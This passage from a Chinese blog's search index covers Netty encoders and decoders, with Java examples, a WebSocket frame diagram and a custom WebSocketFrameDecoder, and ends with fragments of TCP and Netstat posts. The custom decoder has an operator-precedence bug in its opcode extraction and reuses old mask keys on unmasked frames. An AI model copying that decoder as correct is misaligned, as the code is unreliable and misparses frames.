function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> checksum = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    urgentPointer = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> options;</span><br><span class="line">    <span class="keyword">if</span> (headerLength &gt; <span class="number">20</span>) options = <span class="title function_">parseTCPOptions</span>(header.<span class="title function_">slice</span>(_readerIndex)); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">        sourcePort,</span><br><span class="line">        destinationPort,</span><br><span class="line">        sequenceNumber,</span><br><span class="line">        acknowledgmentNumber,</span><br><span class="line">        dataOffset,</span><br><span class="line">        urg,</span><br><span class="line">        ack,</span><br><span class="line">        psh,</span><br><span class="line">        rst,</span><br><span class="line">        syn,</span><br><span class="line">        fin,</span><br><span class="line">        <span class="variable language_">window</span>,</span><br><span class="line">        checksum,</span><br><span class="line">        urgentPointer,</span><br><span class="line">        options</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://tools.ietf.org/html/rfc793#section-3.1">TRANSMISSION CONTROL PROTOCOL</a></li><li><a href="https://book.douban.com/subject/26941639/">网络是怎么连接的</a></li><li><a href="https://book.douban.com/subject/1088054/">TCP&#x2F;IP详解 卷1：协议</a></li><li><a href="https://book.douban.com/subject/1683696/">TCP&#x2F;IP网络与协议（第二版）</a></li><li><a href="https://www.zhihu.com/question/21524257">为什么标准以太网接口缺省的MTU为1500？</a></li><li><a href="https://community.emc.com/message/842879#842879">细说TCP确认机制</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> tcp </tag>
            
            <tag> ip </tag>
            
            <tag> mac </tag>
            
            <tag> arp </tag>
            
            <tag> icmp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netty编解码器</title>
      <link href="/post/netty-codec.html"/>
      <url>/post/netty-codec.html</url>
      
        <content type="html"><![CDATA[<h2 id="Netty编解码器"><a href="#Netty编解码器" class="headerlink" title="Netty编解码器"></a>Netty编解码器</h2><p>编码和解码，或者数据从一种特定协议的格式到另一种格式的转换。这些任务将由通常称为编解码器的组件来处理。每个网络应用程序都必须定义如何解析在两个节点之间来回传输的原始字节，以及如何将其和目标应用程序的数据格式做相互转换。</p><p>例如<a href="websocket.html">WebSocket</a>服务，WebSocket服务器收到是字节流，我们收到字节流后要将其解码成WebSocket消息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-------+-+-------------+-------------------------------+</span><br><span class="line">|F|R|R|R| opcode|M| Payload len |    Extended payload length    |</span><br><span class="line">|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |</span><br><span class="line">|N|V|V|V|       |S|             |   (if payload len==126/127)   |</span><br><span class="line">| |1|2|3|       |K|             |                               |</span><br><span class="line">+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +</span><br><span class="line">|     Extended payload length continued, if payload len == 127  |</span><br><span class="line">+ - - - - - - - - - - - - - - - +-------------------------------+</span><br><span class="line">|                               |Masking-key, if MASK set to 1  |</span><br><span class="line">+-------------------------------+-------------------------------+</span><br><span class="line">| Masking-key (continued)       |          Payload Data         |</span><br><span class="line">+-------------------------------- - - - - - - - - - - - - - - - +</span><br><span class="line">:                     Payload Data continued ...                :</span><br><span class="line">+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +</span><br><span class="line">|                     Payload Data continued ...                |</span><br><span class="line">+---------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>编码器是将消息转换为适合于传输的格式（最有可能的就是字节流）；而对应的解码器则是将网络字节流转换回应用程序的消息格式。编码器操作出站数据，而解码器处理入站数据。</p><p><img src="/images/channelhandler.png" alt="ChannelHandler"></p><h3 id="解码器"><a href="#解码器" class="headerlink" title="解码器"></a>解码器</h3><p>因为解码器是负责将入站数据从一种格式转换到另一种格式的，所以Netty的解码器都实现了<code>ChannelInboundHandler</code>。</p><p>Netty提供下面两个不同用处的解码器：</p><ul><li><p>将字节转解码为消息 – ByteToMessageDecoder 和 ReplayingDecoder</p><p>  <code>ByteToMessageDecoder</code>是一个抽象类，我们需要实现其<code>decode</code>方法。</p><p>  由于你不可能知道远程节点是否会一次性地发送一个完整的消息，所以这个类会对入站数据进行缓冲，直到有足够的数据准备好处理。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ToIntegerDecoder</span> <span class="keyword">extends</span> <span class="title class_">ByteToMessageDecoder</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (in.readableBytes() &gt;= <span class="number">4</span>) out.add(in.readInt());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  上面的例子中，我们要手动判断输入的ByteBuf是否具有足够的数据有点繁琐。下面我们使用<code>ReplayingDecode</code>，它可以让我们不必重复做这个事情。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ToIntegerDecoder</span> <span class="keyword">extends</span> <span class="title class_">ReplayingDecoder</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        out.add(in.readInt());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  使用ReplayingDecoder时会稍慢于ByteToMessageDecoder。</p></li><li><p>将一种消息解码为另一种消息 – MessageToMessageDecoder</p><p>  下面例子中讲Integer类型的消息转换成String类型，然后传递给下一个handler。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IntegerToStringDecoder</span> <span class="keyword">extends</span> <span class="title class_">MessageToMessageDecoder</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">(ChannelHandlerContext ctx, Integer msg, List&lt;Object&gt; out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        out.add(String.valueOf(msg));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>注意：每次调用<code>decode</code>方法后即没新message产生缓冲区也无变化，缓存区数据将在下一轮<code>channelRead</code>事件触发后处理。原因也很好理解，如果一次<code>decoder</code>后没新message产生也没缓存消耗，再执行一次<code>decoder</code>将还是同样的结果（所有条件都没变化），处理不好这会造成死循环。<a href="https://github.com/netty/netty/blob/4.1/codec/src/main/java/io/netty/handler/codec/ByteToMessageDecoder.java#L438">代码32行</a></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">callDecode</span><span class="params">(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (in.isReadable()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">outSize</span> <span class="operator">=</span> out.size();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (outSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                fireChannelRead(ctx, out, outSize);</span><br><span class="line">                out.clear();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this handler was removed before continuing with decoding.</span></span><br><span class="line">                <span class="comment">// If it was removed, it is not safe to continue to operate on the buffer.</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// See:</span></span><br><span class="line">                <span class="comment">// - https://github.com/netty/netty/issues/4635</span></span><br><span class="line">                <span class="keyword">if</span> (ctx.isRemoved()) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                outSize = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">oldInputLength</span> <span class="operator">=</span> in.readableBytes();</span><br><span class="line">            decodeRemovalReentryProtection(ctx, in, out);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this handler was removed before continuing the loop.</span></span><br><span class="line">            <span class="comment">// If it was removed, it is not safe to continue to operate on the buffer.</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// See https://github.com/netty/netty/issues/1664</span></span><br><span class="line">            <span class="keyword">if</span> (ctx.isRemoved()) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (outSize == out.size()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (oldInputLength == in.readableBytes()) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (oldInputLength == in.readableBytes()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DecoderException</span>(</span><br><span class="line">                        StringUtil.simpleClassName(getClass()) +</span><br><span class="line">                                <span class="string">&quot;.decode() did not read anything but decoded a message.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isSingleDecode()) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (DecoderException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception cause) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DecoderException</span>(cause);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="TooLongFrameException"><a href="#TooLongFrameException" class="headerlink" title="TooLongFrameException"></a>TooLongFrameException</h4><p>我们需要在字节可以解码之前在内存中缓冲它们。因此，不能让解码器缓冲大量的数据以至于耗尽可用的内存。为了解除这个常见的顾虑，Netty提供了<code>TooLongFrameException</code>类，如果缓冲区超出指定大小限制时（手动）抛出。如果你正在使用一个可变帧大小的协议，那么这种保护措施将是尤为重要的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeByteToMessageDecoder</span> <span class="keyword">extends</span> <span class="title class_">ByteToMessageDecoder</span> &#123;</span><br><span class="line">　　<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_FRAME_SIZE</span> <span class="operator">=</span> <span class="number">1024</span>;</span><br><span class="line">　　<span class="meta">@Override</span></span><br><span class="line">　　<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">readable</span> <span class="operator">=</span> in.readableBytes();</span><br><span class="line">        <span class="keyword">if</span> (readable &gt; MAX_FRAME_SIZE) &#123;　<span class="comment">// 检查缓冲区中是否有超过MAX_FRAME_SIZE个字节</span></span><br><span class="line">        　　in.skipBytes(readable);　 <span class="comment">// 跳过所有的可读字节，抛出TooLongFrame-Exception 并通知ChannelHandler</span></span><br><span class="line">        　　<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TooLongFrameException</span>(<span class="string">&quot;Frame too big!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// do something</span></span><br><span class="line">        ...</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="WebSocketFrameDecoder"><a href="#WebSocketFrameDecoder" class="headerlink" title="WebSocketFrameDecoder"></a>WebSocketFrameDecoder</h4><p>解析WebSocket消息协议示例</p><figure class="highlight java"><figcaption><span>WebSocketFrameDecoder.java</span><a href="/downloads/code/WebSocketFrameDecoder.java">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketFrameDecoder</span> <span class="keyword">extends</span> <span class="title class_">ByteToMessageDecoder</span> {</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">short</span> <span class="variable">MAX_FRAME_SIZE</span> <span class="operator">=</span> <span class="number">1024</span> * <span class="number">10</span>; <span class="comment">// 10kb</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span> <span class="variable">READ_HEADER</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span> <span class="variable">READ_EXT_PAYLOAD_LEN_16</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span> <span class="variable">READ_EXT_PAYLOAD_LEN_64</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span> <span class="variable">READ_MASK_KEY</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span> <span class="variable">READ_PAYLOAD</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span> <span class="variable">STATE</span> <span class="operator">=</span> READ_HEADER;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// frame</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span> fin;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span> opcode;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span> mask;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> payloadLen;</span><br><span class="line">    <span class="comment">// 无符号byte</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">short</span>[] maskKey = <span class="keyword">new</span> <span class="title class_">short</span>[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] payload;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reset</span><span class="params">()</span> {</span><br><span class="line">        STATE = READ_HEADER;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="keyword">if</span> (STATE == READ_HEADER) {</span><br><span class="line">            <span class="keyword">if</span> (in.readableBytes() &lt; <span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">header</span> <span class="operator">=</span> in.readUnsignedShort();</span><br><span class="line">            fin = (<span class="type">byte</span>) (header &gt;&gt; <span class="number">15</span>);</span><br><span class="line">            opcode = (<span class="type">byte</span>) (header &amp; <span class="number">0b0000111100000000</span> &gt;&gt; <span class="number">8</span>);</span><br><span class="line">            mask = (<span class="type">byte</span>) ((header &amp; <span class="number">0b0000000010000000</span>) &gt;&gt; <span class="number">7</span>);</span><br><span class="line">            payloadLen = header &amp; <span class="number">0b0000000001111111</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (payloadLen == <span class="number">127</span>) STATE = READ_EXT_PAYLOAD_LEN_64;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (payloadLen == <span class="number">126</span>) STATE = READ_EXT_PAYLOAD_LEN_16;</span><br><span class="line">            <span class="keyword">else</span> STATE = READ_MASK_KEY;</span><br><span class="line">        } <span class="keyword">else</span> <span class="keyword">if</span> (STATE == READ_EXT_PAYLOAD_LEN_16) {</span><br><span class="line">            <span class="keyword">if</span> (in.readableBytes() &lt; <span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line">            payloadLen = in.readUnsignedShort();</span><br><span class="line"></span><br><span class="line">            STATE = READ_MASK_KEY;</span><br><span class="line">        } <span class="keyword">else</span> <span class="keyword">if</span> (STATE == READ_EXT_PAYLOAD_LEN_64) {</span><br><span class="line">            <span class="keyword">if</span> (in.readableBytes() &lt; <span class="number">8</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="comment">// 协议规定64位时最高有效位必须是0</span></span><br><span class="line">            payloadLen = in.readLong();</span><br><span class="line"></span><br><span class="line">            STATE = READ_MASK_KEY;</span><br><span class="line">        } <span class="keyword">else</span> <span class="keyword">if</span> (STATE == READ_MASK_KEY) {</span><br><span class="line">            <span class="keyword">if</span> (mask == <span class="number">1</span>) {</span><br><span class="line">                <span class="keyword">if</span> (in.readableBytes() &lt; <span class="number">4</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">                maskKey[<span class="number">0</span>] = in.readUnsignedByte();</span><br><span class="line">                maskKey[<span class="number">1</span>] = in.readUnsignedByte();</span><br><span class="line">                maskKey[<span class="number">2</span>] = in.readUnsignedByte();</span><br><span class="line">                maskKey[<span class="number">3</span>] = in.readUnsignedByte();</span><br><span class="line">            }</span><br><span class="line">            STATE = READ_PAYLOAD;</span><br><span class="line">        } <span class="keyword">else</span> <span class="keyword">if</span> (STATE == READ_PAYLOAD) {</span><br><span class="line">            <span class="keyword">if</span> (payloadLen &gt; MAX_FRAME_SIZE) {</span><br><span class="line">                <span class="comment">//bad frame. you should close the channel.</span></span><br><span class="line">                in.skipBytes(in.readableBytes());</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TooLongFrameException</span>(<span class="string">&quot;Frame too big!&quot;</span>);</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in.readableBytes() &lt; payloadLen) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            payload = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) payloadLen];</span><br><span class="line">            <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (in.isReadable() &amp;&amp; payloadLen &gt; <span class="number">0</span>) {</span><br><span class="line">                payload[pos] = (<span class="type">byte</span>) (in.readByte() ^ maskKey[pos % <span class="number">4</span>]);</span><br><span class="line">                pos++;</span><br><span class="line">                payloadLen--;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            out.add(<span class="keyword">new</span> <span class="title class_">WebSocketFrame</span>(fin, opcode, mask, payload.length, maskKey, payload));</span><br><span class="line">            reset(); <span class="comment">// next frame</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h3><ul><li><p>将消息编码为字节 – MessageToByteEncoder</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IntegerToByteEncoder</span> <span class="keyword">extends</span> <span class="title class_">MessageToByteEncoder</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">encode</span><span class="params">(ChannelHandlerContext ctx, Integer msg, ByteBuf out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        out.writeInt(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>将消息编码为消息 – MessageToMessageEncoder</p></li></ul><h3 id="ByteToMessageCodec-和-MessageToMessageCodec"><a href="#ByteToMessageCodec-和-MessageToMessageCodec" class="headerlink" title="ByteToMessageCodec 和 MessageToMessageCodec"></a>ByteToMessageCodec 和 MessageToMessageCodec</h3><p><code>ByteToMessageCodec</code>将字节编解码为消息，它结合了<code>ByteToMessageDecoder</code>以及它的逆向——<code>MessageToByteEncoder</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IntegerStringCodec</span> <span class="keyword">extends</span> <span class="title class_">ByteToMessageCodec</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">encode</span><span class="params">(ChannelHandlerContext ctx, Integer msg, ByteBuf out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       out.writeInt(msg); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (in.readableBytes() &gt;= <span class="number">4</span>) out.add(in.readInt());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CombinedChannelDuplexHandler"><a href="#CombinedChannelDuplexHandler" class="headerlink" title="CombinedChannelDuplexHandler"></a>CombinedChannelDuplexHandler</h3><p><code>ByteToMessageCodec</code> 和 <code>MessageToMessageCodec</code> 将编解码逻辑在一个类中实现，有时候我们编解码可能在不同的类中，能不能提供一个组合的将编解码组合到一个类中呢？<code>CombinedChannelDuplexHandler</code>提供了这个解决方案。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IntegerByteCodec</span> <span class="keyword">extends</span> <span class="title class_">CombinedChannelDuplexHandler</span>&lt;ToIntegerDecoder, IntegerToByteEncoder&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IntegerByteCodec</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">ToIntegerDecoder</span>(), <span class="keyword">new</span> <span class="title class_">IntegerToByteEncoder</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://book.douban.com/subject/27038538/">Netty实战</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> netty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netstat</title>
      <link href="/post/netstat.html"/>
      <url>/post/netstat.html</url>
      
